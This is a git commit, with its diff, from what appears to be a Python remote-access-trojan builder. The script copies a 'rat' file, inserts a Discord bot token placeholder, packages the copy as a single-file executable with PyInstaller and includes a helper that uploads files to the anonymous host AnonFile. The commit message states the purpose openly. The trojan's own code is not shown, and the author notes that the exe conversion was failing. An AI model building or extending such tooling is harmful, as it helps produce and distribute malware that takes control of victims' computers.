d34ec58491beeee86efa504e17c511eafd46e9a9
ryane-joe <125251551+ryane-joe@users.noreply.github.com>
2023-03-31 03:56:51 +0530

    working exe converter and added the token adding
    made it so that the main rat file is duplicated, and in that duped file the text Enteer is replaced with the word token(will be replaced once the iscord bot is ready to take inputs as tokens).I also attempted to get the conversion of the py file to a exe file goin but failed. i suspect that its due to a  problem w my sys, ill try w a ubuntu vm in the moring its 4 am rn

--- main.py
+++ main.py
@@ -1,10 +1,34 @@
 from anonfile import AnonFile
-import os
 import shutil
+from pathlib2 import Path
+import PyInstaller
+import os
+
 def upload(filepath):
     file_up = AnonFile()
     up = file_up.upload(filepath)
     print(up.url.geturl())
-src = r'lol.txt'
+#TODO  try running this on a vm to fix the OSerror to try debug
+def create_executable(py_file):
+    py_file = os.path.abspath(py_file)
+    output_dir = os.path.dirname(py_file)
+    spec_file = os.path.join(output_dir, 'output.spec')
+    PyInstaller.__main__.run([
+        '--name=output',
+        '--onefile',
+        '--specpath={}'.format(output_dir),
+        '--distpath={}'.format(output_dir),
+        '--workpath={}'.format(output_dir),
+        py_file,
+    ])
+    os.remove(spec_file)
+src = r'ratter.py'
 dest = 'hi.py'
 path = shutil.copyfile(src,dest)
+file = Path(r'hi.py')
+data = file.read_text()
+re = 'token'
+sr = '#Enteer'
+data = data.replace(sr,re)
+file.write_text(data)
+create_executable('hi.py')
